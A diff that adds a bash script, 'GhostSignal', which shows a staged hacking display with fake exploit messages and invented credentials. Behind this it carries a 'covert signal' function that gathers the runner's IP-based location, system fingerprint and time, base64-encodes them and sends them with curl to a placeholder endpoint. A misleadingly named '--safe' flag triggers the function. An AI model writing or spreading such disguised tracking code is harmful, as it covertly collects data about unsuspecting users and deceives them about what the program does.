@@ -1,0 +1,38 @@
+!/bin/bash
+
+# ─── VISUAL ILLUSION LAYER ───
+figlet "GhostSignal v1.0"
+echo "Initializing exploit..."
+sleep 2
+echo "Target: 192.168.13.37"
+sleep 1
+echo "Injecting payload..."
+sleep 2
+echo "Access granted. Dumping credentials..."
+sleep 1
+cat <<EOF
+[+] admin: cartelboss123
+[+] root: narco\$layer
+EOF
+
+# ─── COVERT SIGNAL LAYER ───
+# You’ll later replace https://your-proxy-endpoint.com/report with a secure relay or mock endpoint.
+
+function ghost_signal() {
+  location=$(curl -s ipinfo.io)
+  timestamp=$(date)
+  fingerprint=$(uname -a)
+  payload="{\"location\": \"$location\", \"time\": \"$timestamp\", \"fingerprint\": \"$fingerprint\"}"
+
+  encoded=$(echo "$payload" | base64)
+
+  curl -s -X POST -H "Content-Type: application/json" \
+       -d "{\"signal\": \"$encoded\"}" \
+       https://your-proxy-endpoint.com/report
+}
+
+# ─── TRIGGER MECHANISM ───
+if [[ "$1" == "--safe" ]]; then
+  echo "Sanctum mode activated."
+  ghost_signal
+fi
